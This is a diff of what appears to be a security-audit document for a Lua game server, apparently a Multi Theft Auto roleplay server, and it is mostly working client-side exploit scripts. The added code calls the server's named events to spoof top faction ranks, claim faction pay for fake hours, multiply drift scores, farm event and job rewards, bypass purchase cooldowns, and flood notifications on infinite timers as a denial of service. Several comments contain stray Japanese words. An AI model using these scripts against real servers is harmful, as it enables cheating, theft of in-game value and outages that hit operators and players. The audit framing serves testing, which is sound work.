-        setElementData(localPlayer, "player:rank", 17)  -- Highest rank
-        
-        -- Start duty with fake credentials
-        triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "startDUTY", 
-            localPlayer, getElementData(localPlayer, "player:sid"), 
-            faction, faction, 1)
-        
-        -- Now have access to all faction equipment/vehicles/permissions
-    end
+-- Exploit: Start duty with highest rank in any faction without actually being a member
+
+-- Method 1: Direct duty start with fake faction data
+local my_sid = 12345
+
+-- Join SAPD as Chief (rank 17)
+setElementData(localPlayer, "player:faction", "SAPD")
+setElementData(localPlayer, "player:rank", 17)
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "startDUTY", 
+    localPlayer, my_sid, "SAPD", "SAPD", 285)
+
+-- Join SAFD as Fire Chief
+setElementData(localPlayer, "player:faction", "SAFD")
+setElementData(localPlayer, "player:rank", 17)
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "startDUTY", 
+    localPlayer, my_sid, "SAFD", "SAFD", 305)
+
+-- Method 2: Start duty in all factions simultaneously
+local factions = {
+    {name="SAPD", id=285, rank=17},
+    {name="SAFD", id=305, rank=17},
+    {name="ARMY", id=400, rank=17},
+    {name="GOV", id=500, rank=17}
+}
+
+for _, faction in ipairs(factions) do
+    setElementData(localPlayer, "player:faction", faction.name)
+    setElementData(localPlayer, "player:rank", faction.rank)
+    triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "startDUTY", 
+        localPlayer, my_sid, faction.name, faction.name, faction.id)
 end
--- Expected: Player gains highest rank in all factions simultaneously
--- Impact: Complete faction system破壊, unlimited privileges
+
+-- Method 3: Check faction payouts without authorization
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "checkPayouts", 
+    localPlayer, "SAPD")
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "checkPayouts", 
+    localPlayer, "SAFD")
+
+-- Method 4: Claim faction payment without being on duty
+local fake_work_hours = 999  -- 999 hours worked
+setElementData(localPlayer, "player:workinjob", fake_work_hours)
+setElementData(localPlayer, "player:rank", 17)
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "paymentFaction", 
+    localPlayer, my_sid, "SAPD", 9550 * fake_work_hours * 1.3)
+
+-- Expected: Player gains highest rank in all factions, unlimited faction access
+-- Impact: Complete faction system破壊, unlimited equipment/vehicles/salary
 ```
 
 ---
@@ -597,94 +933,169 @@ Events that create notifications lack rate limiting.
 
 ### Test Examples for Race Condition Exploits
 
-#### Test 1: Drift Score Multiplication
+#### Test 1: Drift Score Manipulation
 ```lua
--- Exploit: Submit same drift score multiple times
-function exploitDriftScoreMultiplication()
-    local fake_score = 999999
-    
-    -- Rapidly submit score before server processes first submission
-    for i=1, 100 do
-        triggerServerEvent("drift:aktualizujpunkty", localPlayer, fake_score)
-        triggerServerEvent("drift:savedrift", localPlayer, fake_score)
+-- Exploit: Submit fake/multiplied drift scores to leaderboard
+
+-- Submit massive fake score
+local fake_score = 9999999
+triggerServerEvent("drift:aktualizujpunkty", localPlayer, fake_score)
+triggerServerEvent("drift:savedrift", localPlayer, fake_score)
+
+-- Rapidly submit score multiple times (race condition)
+for i=1, 100 do
+    triggerServerEvent("drift:aktualizujpunkty", localPlayer, 999999)
+    triggerServerEvent("drift:savedrift", localPlayer, 999999)
+end
+
+-- Submit negative score (might cause overflow to positive)
+triggerServerEvent("drift:aktualizujpunkty", localPlayer, -999999999)
+
+-- Alternate between update and save rapidly
+for i=1, 500 do
+    if i % 2 == 0 then
+        triggerServerEvent("drift:aktualizujpunkty", localPlayer, 999999)
+    else
+        triggerServerEvent("drift:savedrift", localPlayer, 999999)
     end
 end
--- Expected: Score multiplied by 100x
--- Impact: Leaderboard manipulation, unfair competition
+
+-- Expected: Score multiplied 100x, top of leaderboard
+-- Impact: Leaderboard manipulation, unfair competition, rewards theft
 ```
 
 #### Test 2: Event Reward Farming
 ```lua
--- Exploit: Complete event multiple times before server registers
-function exploitEventRewardFarming()
-    -- Find an event ending trigger
-    for i=1, 50 do
-        triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
-        triggerServerEvent("ev", resourceRoot, "zakoczenieLabiryntu", localPlayer)
-    end
+-- Exploit: Complete events multiple times instantly to farm rewards
+
+-- Rapid race completion
+for i=1, 100 do
+    triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
 end
--- Expected: Receive 50x event rewards
--- Impact: Economy破壊, unfair advantage
+
+-- Rapid maze/labyrinth completion
+for i=1, 100 do
+    triggerServerEvent("ev", resourceRoot, "zakoczenieLabiryntu", localPlayer)
+end
+
+-- Complete both events simultaneously
+for i=1, 50 do
+    triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
+    triggerServerEvent("ev", resourceRoot, "zakoczenieLabiryntu", localPlayer)
+end
+
+-- Continuous event farming
+setTimer(function()
+    triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
+end, 100, 0)  -- Every 100ms forever
+
+-- Expected: Receive 100x+ event rewards instantly
+-- Impact: Economy破壊, unfair advantage, event system abuse
 ```
 
 #### Test 3: Purchase Cooldown Bypass
 ```lua
--- Exploit: Remove cooldown check and spam purchases
-function exploitCooldownBypass()
-    -- Override the cooldown check
-    lastTickCount = nil
-    
-    -- Now spam purchases
-    for i=1, 1000 do
+-- Exploit: Bypass client-side cooldown to spam purchases
+
+-- Method 1: Set cooldown to 0
+lastTickCount = 0
+
+-- Spam purchases with no cooldown
+for i=1, 5000 do
+    triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", 
+        localPlayer, "Maska", 0, 12345)
+end
+
+-- Method 2: Constantly reset lastTickCount
+for i=1, 1000 do
+    lastTickCount = getTickCount() - 2000  -- Make it think 2 seconds passed
+    triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", 
+        localPlayer, "Plecak", 0, 12345)
+end
+
+-- Method 3: Parallel purchase spam (multiple items at once)
+local items = {"Maska", "Plecak", "Kamizelka kuloodporna", "Rękawiczki"}
+for i=1, 2000 do
+    for _, item in ipairs(items) do
         triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", 
-            localPlayer, "Mask", 1, getElementData(localPlayer, "player:sid"))
+            localPlayer, item, 0, 12345)
     end
 end
--- Expected: 1000 items purchased instantly
--- Impact: Server lag, database overflow, economy破壊
+
+-- Expected: 10,000+ items purchased instantly
+-- Impact: Server lag, database overflow, economy破壊, possible crash
 ```
 
 #### Test 4: Job Action Race Condition
 ```lua
--- Exploit: Complete job action multiple times simultaneously
-function exploitJobRaceCondition()
-    local job_events = {
-        "ev_gornik",
-        "ev_dealer",
-        "ev_budowniczy"
-    }
-    
-    -- Trigger all job completion events at once
-    for i=1, 100 do
-        for _, event in ipairs(job_events) do
-            triggerServerEvent(event, resourceRoot, "complete", localPlayer, 999999)
-        end
+-- Exploit: Complete multiple jobs simultaneously to multiply rewards
+
+-- Complete miner job 100 times instantly
+for i=1, 100 do
+    triggerServerEvent("ev_gornik", resourceRoot, "complete", localPlayer, 999999)
+end
+
+-- Complete dealer job 100 times
+for i=1, 100 do
+    triggerServerEvent("ev_dealer", resourceRoot, "complete", localPlayer, 999999)
+end
+
+-- Complete all jobs simultaneously (race condition)
+local job_events = {"ev_gornik", "ev_dealer", "ev_budowniczy", "ev_level"}
+for i=1, 500 do
+    for _, event in ipairs(job_events) do
+        triggerServerEvent(event, resourceRoot, "complete", localPlayer, 999999)
+        triggerServerEvent(event, resourceRoot, "reward", localPlayer, 5000000)
     end
 end
--- Expected: Receive 100x job rewards from multiple jobs
--- Impact: Job system破壊, economy inflation
+
+-- Spam specific high-paying job
+for i=1, 1000 do
+    triggerServerEvent("ev_dealer", resourceRoot, "sellDrugs", localPlayer, 9999, 9999999)
+end
+
+-- Expected: Receive 500x job rewards from all jobs simultaneously
+-- Impact: Job system破壊, economy hyperinflation, instant max level
 ```
 
-#### Test 5: Notification Spam DoS
+#### Test 5: Notification Spam DoS Attack
 ```lua
--- Exploit: Flood server with notification creation/deletion
-function exploitNotificationFlood()
-    for i=1, 10000 do
-        -- Create notification
-        triggerServerEvent("ev", resourceRoot, "createNotification", 
-            localPlayer, "Spam notification " .. i)
-        
-        -- Immediately delete it
-        triggerServerEvent("ev", resourceRoot, "deleteNotification", 
-            localPlayer, i)
-        
-        -- Delete all notifications
-        triggerServerEvent("ev", resourceRoot, "deleteNotificationAll", 
-            localPlayer, "SAPD")
-    end
+-- Exploit: Flood server with notification creation/deletion causing DoS
+
+-- Method 1: Create thousands of notifications
+for i=1, 50000 do
+    triggerServerEvent("ev", resourceRoot, "createNotification", 
+        localPlayer, "SPAM " .. i)
 end
--- Expected: Server becomes unresponsive
--- Impact: DoS attack, database corruption, server crash
+
+-- Method 2: Create and delete rapidly (thrashing)
+for i=1, 100000 do
+    triggerServerEvent("ev", resourceRoot, "createNotification", 
+        localPlayer, "Notification " .. i)
+    triggerServerEvent("ev", resourceRoot, "deleteNotification", 
+        localPlayer, i)
+end
+
+-- Method 3: Mass delete all notifications repeatedly
+for i=1, 10000 do
+    triggerServerEvent("ev", resourceRoot, "deleteNotificationAll", 
+        localPlayer, "SAPD")
+    triggerServerEvent("ev", resourceRoot, "deleteNotificationAll", 
+        localPlayer, "SAFD")
+end
+
+-- Method 4: Continuous notification spam (infinite loop)
+setTimer(function()
+    for i=1, 100 do
+        triggerServerEvent("ev", resourceRoot, "createNotification", 
+            localPlayer, "DoS #" .. math.random(999999))
+        triggerServerEvent("ev", resourceRoot, "deleteNotification", 
+            localPlayer, math.random(999999))
+    end
+end, 10, 0)  -- Every 10ms forever = 10,000 requests/sec
+
+-- Expected: Server becomes completely unresponsive, possible crash
+-- Impact: DoS attack, database corruption, server crash, mass disconnect
 ```
 
 ---
